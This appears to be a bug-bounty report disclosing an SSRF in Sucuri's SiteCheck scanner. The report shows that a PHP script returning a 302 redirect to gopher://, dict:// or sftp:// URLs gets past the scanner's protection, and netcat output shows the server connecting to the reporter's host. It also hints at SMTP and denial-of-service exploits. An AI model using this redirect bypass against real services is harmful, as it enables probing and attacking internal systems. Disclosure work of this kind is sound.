Summary:

Hi, Sucuri Security Team. I found a SSRF in https://sitecheck.sucuri.net/

Although there was already an protection to prevent SSRF, but it can be bypassed by 302 redirection!

**ssrf.php**
> <?php header("Location: gopher://orange.tw:12345/_HELLO%20WORLD");

by bisiting followed URL
> https://sitecheck.sucuri.net/results/orange.tw/ssrf.php

And your port will receive "HELLO WORLD"
```
orange@z:~$ nc -vvl 12345
Listening on [0.0.0.0] (family 0, port 12345)
Connection from [173.255.233.124] port 12345 [tcp/*] accepted (family 2, sport 57076)
HELLO WORLD
```

There are also multiple PROTOCOL can be used, such as HTTP, HTTPS, SFTP, SCP, GOPHER, DICT...
You can also use `DICT` and `SFTP` to get the version of `libssh` and `libcurl`
  
**Get libcurl version**
> <?php header("Location: dict://orange.tw:12345/");

**Get libssh version**
> <?php header("Location: sftp://orange.tw:12345/");


You can refer followed case to get more exploitations, such as Crafted SMTP connection exploit, Denial of service...
